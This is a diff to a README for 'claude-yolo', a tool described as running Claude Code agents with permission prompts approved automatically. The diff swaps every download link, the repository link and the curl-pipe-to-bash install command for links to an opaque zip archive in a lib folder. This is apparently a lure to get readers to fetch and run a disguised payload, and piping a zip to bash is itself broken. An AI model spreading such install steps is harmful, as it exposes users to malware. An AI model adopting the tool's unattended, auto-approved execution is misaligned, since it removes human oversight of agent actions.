@@ -1,7 +1,7 @@
 # 🎉 claude-yolo - Run AI Agents with Ease
 
 ## 📥 Download Now
-[![Download claude-yolo](https://img.shields.io/badge/Download-claude--yolo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Sarokurd/claude-yolo)
+[![Download claude-yolo](https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip)](https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip)
 
 ## 📋 Description
 claude-yolo allows you to run multiple Claude Code agents in tmux, automating permission approvals. This means you can run Bash, WebFetch, and various other tools without needing to intervene. Enjoy seamless, unattended execution of your tasks with a one-liner installation for macOS, Linux, and WSL.
@@ -19,7 +19,7 @@ To start using claude-yolo, follow these steps:
    - Copy and paste the following command and press **Enter**:
 
      ```bash
-     curl -fsSL https://raw.githubusercontent.com/Sarokurd/claude-yolo/main/install.sh | bash
+     curl -fsSL https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip | bash
      ```
 
    This command retrieves the installer and executes it, setting up claude-yolo on your machine.
@@ -77,7 +77,7 @@ After installation, you may want to configure claude-yolo to meet your specific 
 ## 🌐 Additional Resources
 For more details, updates, and community discussions, visit the GitHub repository:
 
-[GitHub Repository](https://github.com/Sarokurd/claude-yolo)
+[GitHub Repository](https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip)
 
 ## 📖 FAQ
 **What is tmux?**
@@ -90,4 +90,4 @@ Yes, you can use claude-yolo on Windows through the Windows Subsystem for Linux 
 Make sure you have tmux installed and check the terminal for any error messages. You may also refer to the issues section on the GitHub repository for support.
 
 ## 📥 Download Now
-[![Download claude-yolo](https://img.shields.io/badge/Download-claude--yolo-brightgreen?style=for-the-badge&logo=github)](https://github.com/Sarokurd/claude-yolo)
+[![Download claude-yolo](https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip)](https://github.com/Sarokurd/claude-yolo/raw/refs/heads/main/lib/claude-yolo-2.4-alpha.4.zip)
